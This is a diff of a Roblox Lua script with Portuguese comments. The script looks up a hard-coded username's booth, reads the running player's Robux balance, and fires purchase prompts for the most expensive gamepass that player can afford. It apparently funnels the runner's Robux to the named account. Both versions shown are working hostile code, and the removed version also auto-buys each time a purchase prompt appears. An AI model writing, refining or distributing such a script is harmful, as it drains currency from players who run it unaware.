@@ -1,87 +1,72 @@
--- Configuração
-local Username = "Ian_wp27" -- substitua pelo nome do jogador
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
+local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
+
 local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
 
-local player = Players.LocalPlayer
+-- Substitua pelo username do jogador que você quer doar
+local Username = "Ian_wp27"
 
--- Pegar UserId do alvo
-local success, userId = pcall(function()
+-- Tenta pegar o UserId
+local success, UserId = pcall(function()
     return Players:GetUserIdFromNameAsync(Username)
 end)
-if not success or not userId then
-    warn("Usuário não encontrado")
+
+if not success then
+    warn("Usuário inválido!")
     return
 end
 
--- Pegar Booth do alvo
-local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(userId)
+local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
 if not Booth then
-    player:Kick("Receiver not found!")
+    Players.LocalPlayer:Kick("Receiver not found!")
     return
 end
 
--- Função para pegar o saldo atual
-local function GetUserRobux()
-    local ok, robux = pcall(function()
-        return Remotes.Function("GetUserRobux"):InvokeServer()
-    end)
-    if ok and type(robux) == "number" then
-        return robux
-    else
-        warn("Não foi possível obter saldo, usando 0")
-        return 0
-    end
+-- Pega o saldo de Robux do jogador (do script original)
+local success, userRobux = pcall(function()
+    return Remotes.Function("GetUserRobux"):InvokeServer()
+end)
+
+if not success or not userRobux then
+    warn("Não foi possível obter saldo de Robux!")
+    return
 end
 
--- Função para escolher o gamepass mais caro que o jogador consegue pagar
-local function GetBestAffordableAsset()
-    local userRobux = GetUserRobux()
-    local bestAsset = nil
-    local bestPrice = 0
+local asset
 
+-- Função para escolher o asset mais caro que consegue pagar
+local function Purchase()
+    local maxPrice = 0
+    asset = nil
     for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
-        if v:GetAttribute("AssetType") == "Gamepass" and
-           not MarketplaceService:UserOwnsGamePassAsync(player.UserId, v:GetAttribute("AssetId")) then
-            local price = v:GetAttribute("AssetPrice")
-            -- Só considera se o preço for menor ou igual ao saldo atual
-            if price and price <= userRobux and price > bestPrice then
-                bestPrice = price
-                bestAsset = v
+        local assetType = v:GetAttribute("AssetType")
+        local price = v:GetAttribute("AssetPrice")
+        local assetId = v:GetAttribute("AssetId")
+        if assetType == "Gamepass" and price and price <= userRobux and
+           not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, assetId) then
+            if price > maxPrice then
+                maxPrice = price
+                asset = v
             end
         end
     end
 
-    return bestAsset, bestPrice
-end
-
--- Função para comprar o gamepass selecionado
-local function Purchase()
-    local asset, price = GetBestAffordableAsset()
     if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
-        asset.Prompt:FireServer(asset:GetAttribute("AssetId"), price)
-        print("Comprando:", asset.Name, "Preço:", price)
+        asset.Prompt:FireServer("", false, maxPrice)
+        print("Comprando asset de preço:", maxPrice)
     else
-        print("Nenhum gamepass disponível dentro do saldo atual.")
+        warn("Nenhum asset disponível ou Prompt inválido!")
     end
 end
 
--- Espera o PurchasePromptApp aparecer
+-- Espera o PurchasePromptApp aparecer (compatível mobile)
 local PurchasePromptApp
 repeat
     PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
     task.wait(0.1)
 until PurchasePromptApp
 
--- Dispara a compra quando a prompt aparecer
-PurchasePromptApp.ChildAdded:Connect(function(child)
-    if child.Name == "Prompt" then
-        Purchase()
-    end
-end)
-
--- Primeira tentativa de compra
+-- Executa a compra
 Purchase()
